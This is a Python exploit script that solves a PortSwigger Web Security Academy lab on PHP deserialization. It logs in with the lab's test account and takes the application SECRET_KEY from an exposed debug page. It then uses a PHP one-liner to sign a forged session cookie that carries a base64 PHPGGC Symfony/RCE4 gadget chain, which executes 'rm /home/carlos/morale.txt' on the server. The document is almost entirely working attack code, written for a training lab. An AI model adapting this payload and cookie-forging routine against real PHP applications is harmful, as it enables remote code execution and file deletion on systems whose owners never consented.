# Exploiting PHP deserialization with a pre-built gadget chain

# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain

import os
import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#		PAYLOAD GENERATED WITH PHPGGC:
#		https://github.com/ambionics/phpggc
#
#		$> phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' 2>/dev/null | base64 -w 0

PHPGGC_PAYLOAD = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="


##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Sending connection to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def get_cookies(s):
	session = s.cookies['session']
	decoded_session = urllib.parse.unquote(session)
	print('\n[+] Found Session Cookie:\t\t%s' % decoded_session)
	time.sleep(1)
	sig = re.search(r'"sig_hmac_sha1":"(.*)"}', decoded_session).group(1)
	print('[+] Found sig_hmac_sha1:\t\t%s' % sig)
	time.sleep(1)
	token = re.search(r'"token":"(.*)","sig', decoded_session).group(1)
	print('\n[+] Found Token:\t\t\t%s' % token)
	time.sleep(1)
	decoded_token = base64.b64decode(token).decode()
	print('[+] Decoded Token:\t\t\t%s' % decoded_token)
	time.sleep(1)
	access_token = re.search('"access_token";s:32:"(.*)";', decoded_token).group(1)
	print('[+] Found Access Token:\t\t\t%s' % access_token)
	time.sleep(1)
	return access_token, sig

def sign_cookie(s, url, secret_key):
	print('\n[+] Trying to build a malicious cookie signed with the secret_key...\n')
	php_template = f"""\\$object = \\"{PHPGGC_PAYLOAD}\\"; \\$secretKey = \\"{secret_key}\\"; \\$cookie = urlencode('\\{{\\"token\\":\\"' . \\$object . '\\",\\"sig_hmac_sha1\\":\\"' . hash_hmac('sha1', \\$object, \\$secretKey) . '\\"\\}}'); echo \\$cookie;"""
	resp = os.popen(f'php -r "{php_template}"', 'r', 1)
	cookie = resp.readline().replace('%5C', '')
	print(cookie)
	return cookie

def get_secret_key(s, url):
	r = s.get(url)
	debug_line = re.search(r'<!--(.*)-->', r.text).group(1)
	print('\n[+] Found Comment on the main page:\t%s' % debug_line)
	debug_path = re.search(r'href=(.*)>Debug', debug_line).group(1)
	print('[+] Following the debug link: \t\t%s' % debug_path)
	r = s.get(url + debug_path)
	secret_key = re.search(r'SECRET_KEY </td><td class="v">(.*) </td>', r.text).group(1)
	print('[+] Found Application Secret key:\t%s' % secret_key)
	return secret_key


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting PHP deserialization with a pre-built gadget chain')
	parser = argparse.ArgumentParser(description="[+] Lab: Exploiting PHP deserialization with a pre-built gadget chain")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos morale.txt file...\n')
			time.sleep(1)
			print('[+] Trying to send the payload generated by PHPGCC...')
			r = connect_as_wiener(s, url)
			access_token, sig = get_cookies(s)
			secret_key = get_secret_key(s, url)
			cookie = sign_cookie(s, url, secret_key)
			s.cookies.clear()
			cookies= {'session': cookie}
			print('[+] Sending the request...')
			r = s.get(url, cookies=cookies)
			if r.status_code == 500:
				print('[+] Request sent results to an internal error !')
			time.sleep(2)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
